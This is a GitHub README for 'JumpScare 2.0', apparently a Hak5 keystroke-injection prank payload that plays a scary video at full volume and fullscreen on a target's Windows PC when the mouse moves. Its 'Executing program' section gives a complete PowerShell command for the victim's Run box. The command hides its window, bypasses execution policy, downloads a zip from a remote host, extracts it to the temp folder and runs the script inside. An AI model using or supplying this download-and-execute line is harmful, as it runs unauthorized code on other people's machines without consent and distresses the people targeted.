![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)

<img src="https://media.giphy.com/media/VgCDAzcKvsR6OM0uWg/giphy.gif" width="50"> 

<h1 align="center">
  <a href="https://git.io/typing-svg">
    <img src="https://readme-typing-svg.herokuapp.com/?lines=Welcome+to;JumpScare+2.0!+😈&center=true&size=30">
  </a>
</h1>

<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#Description">Description</a></li>
    <li><a href="#getting-started">Getting Started</a></li>
    <li><a href="#Contributing">Contributing</a></li>
    <li><a href="#Version-History">Version History</a></li>
    <li><a href="#Contact">Contact</a></li>
    <li><a href="#Acknowledgments">Acknowledgments</a></li>
  </ol>
</details>

# JumpScare 2.0

A script used to jumpscare your target

## Description

This script will jumpscare your target 

A jumpscare video will be downloaded to their temp directory 

When a mouse movement is detected that video will be played in the powershell console at max volume and fullscreen

## Getting Started

### Dependencies

* An internet connection
* Windows 10,11

<p align="right">(<a href="#top">back to top</a>)</p>

### Executing program

* Plug in your device
* Invoke-WebRequest will be entered in the Run Box to download and execute the dependencies and payload
```
powershell -w h -NoP -NonI -Exec Bypass $U='https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/Assets/js.zip';$Z="$env:TMP"+'\js.zip';$D="$env:TMP"+'\js';iwr -Uri $U -O $Z;Expand-Archive $Z -DestinationPath $D\ -Force;powershell $D\js.ps1
```

<p align="right">(<a href="#top">back to top</a>)</p>

## Contributing

All contributors names will be listed here

I am Jakoby

<p align="right">(<a href="#top">back to top</a>)</p>

## Version History

* 0.1
    * Initial Release

<p align="right">(<a href="#top">back to top</a>)</p>

<!-- CONTACT -->
## Contact

<h2 align="center">📱 My Socials 📱</h2>
<div align=center>
<table>
  <tr>
    <td align="center" width="96">
      <a href="https://youtube.com/c/IamJakoby?sub_confirmation=1">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/youtube-svgrepo-com.svg width="48" height="48" alt="C#" />
      </a>
      <br>YouTube
    </td>
    <td align="center" width="96">
      <a href="https://twitter.com/I_Am_Jakoby">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/twitter.png width="48" height="48" alt="Python" />
      </a>
      <br>Twitter
    </td>
    <td align="center" width="96">
      <a href="https://www.instagram.com/i_am_jakoby/">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/insta.png width="48" height="48" alt="Golang" />
      </a>
      <br>Instagram
    </td>
    <td align="center" width="96">
      <a href="https://discord.gg/MYYER2ZcJF">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/discord-v2-svgrepo-com.svg width="48" height="48" alt="Jsonnet" />
      </a>
      <br>Discord
    </td>
  </tr>
</table>
</div>

<p align="right">(<a href="#top">back to top</a>)</p>

<!-- ACKNOWLEDGMENTS -->
## Acknowledgments

* [Hak5](https://hak5.org/)
* [MG](https://github.com/OMG-MG)

<p align="right">(<a href="#top">back to top</a>)</p>

<p align="center">
        <img src="https://raw.githubusercontent.com/bornmay/bornmay/Update/svg/Bottom.svg" alt="Github Stats" />
</p>
